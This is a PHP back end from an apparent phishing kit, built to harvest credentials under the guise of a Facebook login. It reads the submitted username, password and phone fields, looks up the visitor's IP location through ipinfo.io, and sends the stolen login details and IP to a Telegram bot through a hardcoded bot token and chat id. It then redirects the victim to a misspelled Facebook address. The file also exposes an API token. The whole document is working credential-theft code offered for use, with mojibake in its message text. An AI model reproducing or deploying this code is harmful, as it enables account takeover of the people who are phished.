<?php
header ('Location: https://facbook.com/ ');
$API_KEY = "1799452510:AAEk7drd0ZPGQqcLFFBzawPB3ZNS12eWDZ4";
?>
<?php
 $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
 $api = json_decode(file_get_contents("https://ipinfo.io/$ip"));
 $city = $api->city;
 $countryfromip = $api->country; 
$admin = 1173831158; 
$user = $_POST["medo"];
$pass = $_POST["MEDO"];
$login = $_POST["login"];
$tier = $_POST["tier"];
$phone = $_POST['phone'];
$text = urlencode("
๐ซ - ๐ป๐ฒ๐ ๐น๐ผ๐ด๐ถ๐ป ๐ฏ๐ -  ๐ฆน๐ธ๐ฝ๐ณ๐ด๐ ๐ต๐ฐ๐ฒ๐ด๐ฑ๐พ๐พ๐บ ๐ฆน
โโโโโโโโโโโโ
แฏ แดแดแดษชส ๐ `$user`

แฏ แดแดssแดกแดสแด ๐ `$pass`

แฏ ip ๐  $ip
โโโโโโโโโโโโ
๐ฎ๐ถ๐ฅ - สส :- @SS0OOS 
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
